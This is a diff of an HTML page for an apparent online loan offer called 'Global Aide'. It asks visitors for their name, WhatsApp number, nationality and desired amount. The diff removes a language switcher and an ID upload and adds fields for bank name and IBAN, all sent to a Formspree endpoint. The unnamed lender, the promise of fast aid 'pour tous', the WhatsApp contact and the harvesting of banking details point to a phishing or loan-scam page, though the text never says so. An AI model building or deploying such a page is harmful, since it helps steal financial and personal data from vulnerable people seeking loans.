@@ -7,68 +7,50 @@
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-50 font-sans">
-
     <section class="min-h-screen flex flex-col items-center justify-center p-6 bg-blue-700 text-white text-center">
         <h1 class="text-5xl font-black mb-4">Global Aide</h1>
-        <p class="text-xl mb-8 opacity-90" id="hero-sub">Soutien financier sérieux, honnête et rapide pour tous.</p>
-        
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10 w-full max-w-2xl">
-            <button onclick="changeLanguage('fr')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇫🇷 Français</button>
-            <button onclick="changeLanguage('en')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇺🇸 English</button>
-            <button onclick="changeLanguage('es')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇪🇸 Español</button>
-            <button onclick="changeLanguage('de')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇩🇪 Deutsch</button>
-        </div>
-        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-10 py-4 rounded-full font-bold text-xl uppercase" id="btn-start">Continuer</a>
+        <p class="text-xl mb-8">Soutien financier sérieux et rapide pour tous.</p>
+        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-10 py-4 rounded-full font-bold text-xl uppercase">Commencer</a>
     </section>
 
-    <section id="formulaire" class="max-w-4xl mx-auto my-20 p-8 bg-white rounded-3xl shadow-2xl">
-        <h2 class="text-3xl font-bold mb-8 text-center text-blue-800" id="form-title">Demande de Prêt en Ligne</h2>
-        
-        <form action="https://formspree.io/f/xnjqwngo" method="POST" enctype="multipart/form-data" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+    <section id="formulaire" class="max-w-4xl mx-auto my-10 p-8 bg-white rounded-3xl shadow-2xl">
+        <h2 class="text-3xl font-bold mb-8 text-center text-blue-800">Demande de Prêt en Ligne</h2>
+        <form action="https://formspree.io/f/xnjqwngo" method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-6">
             <div>
-                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-nom">Nom complet</label>
+                <label class="block text-sm font-bold mb-2">NOM COMPLET</label>
                 <input type="text" name="nom" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
             </div>
             <div>
-                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-tel">Numéro WhatsApp</label>
-                <input type="tel" name="telephone" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
+                <label class="block text-sm font-bold mb-2">WHATSAPP</label>
+                <input type="tel" name="whatsapp" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
             </div>
             <div>
-                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-pays">Nationalité</label>
-                <input type="text" name="pays" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
-            </div>
-            <div>
-                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-montant">Montant souhaité</label>
+                <label class="block text-sm font-bold mb-2">MONTANT (€/$)</label>
                 <input type="number" name="montant" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
             </div>
-            <div class="col-span-full">
-                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-file">Joindre votre pièce d'identité (Photo ou PDF)</label>
-                <input type="file" name="piece_identite" accept="image/*,.pdf" required class="w-full p-4 bg-blue-50 border-2 border-dashed border-blue-200 rounded-xl text-black">
+            <div>
+                <label class="block text-sm font-bold mb-2">NATIONALITÉ</label>
+                <input type="text" name="pays" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
             </div>
-            <button type="submit" class="col-span-full bg-blue-600 text-white p-5 rounded-xl font-bold text-xl hover:bg-blue-700 shadow-lg" id="btn-submit">Envoyer ma demande</button>
+
+            <div class="col-span-full border-t pt-6 mt-4">
+                <h3 class="text-lg font-bold mb-4 text-blue-600 uppercase">Coordonnées Bancaires</h3>
+            </div>
+            <div>
+                <label class="block text-sm font-bold mb-2">NOM DE LA BANQUE</label>
+                <input type="text" name="banque" required class="w-full p-4 bg-blue-50 border rounded-xl text-black">
+            </div>
+            <div>
+                <label class="block text-sm font-bold mb-2">IBAN / NUMÉRO DE COMPTE</label>
+                <input type="text" name="iban" required class="w-full p-4 bg-blue-50 border rounded-xl text-black">
+            </div>
+
+            <button type="submit" class="col-span-full bg-blue-600 text-white p-5 rounded-xl font-bold text-xl hover:bg-blue-700 shadow-lg">
+                ENVOYER MA DEMANDE
+            </button>
         </form>
     </section>
-
-    <script>
-        const translations = {
-            fr: { hero: "Soutien financier sérieux, honnête et rapide pour tous.", start: "Continuer", title: "Demande de Prêt en Ligne", nom: "Nom complet", tel: "Numéro WhatsApp", pays: "Nationalité", montant: "Montant souhaité", file: "Pièce d'identité (Photo/PDF)", submit: "Envoyer ma demande" },
-            en: { hero: "Serious, honest and fast financial support for all.", start: "Continue", title: "Online Loan Application", nom: "Full Name", tel: "WhatsApp Number", pays: "Nationality", montant: "Amount requested", file: "ID Proof (Photo/PDF)", submit: "Submit application" },
-            es: { hero: "Apoyo financiero serio, honesto y rápido para todos.", start: "Continuar", title: "Solicitud de Préstamo", nom: "Nombre completo", tel: "WhatsApp", pays: "Nacionalidad", montant: "Monto solicitado", file: "Documento de identidad", submit: "Enviar solicitud" },
-            de: { hero: "Seriöse und schnelle finanzielle Unterstützung für alle.", start: "Weiter", title: "Kreditantrag Online", nom: "Vollständiger Name", tel: "WhatsApp Nummer", pays: "Nationalität", montant: "Wunschbetrag", file: "Ausweisdokument", submit: "Antrag senden" }
-        };
-
-        function changeLanguage(lang) {
-            document.getElementById('hero-sub').innerText = translations[lang].hero;
-            document.getElementById('btn-start').innerText = translations[lang].start;
-            document.getElementById('form-title').innerText = translations[lang].title;
-            document.getElementById('lbl-nom').innerText = translations[lang].nom;
-            document.getElementById('lbl-tel').innerText = translations[lang].tel;
-            document.getElementById('lbl-pays').innerText = translations[lang].pays;
-            document.getElementById('lbl-montant').innerText = translations[lang].montant;
-            document.getElementById('lbl-file').innerText = translations[lang].file;
-            document.getElementById('btn-submit').innerText = translations[lang].submit;
-        }
-    </script>
 </body>
 </html>
+
 
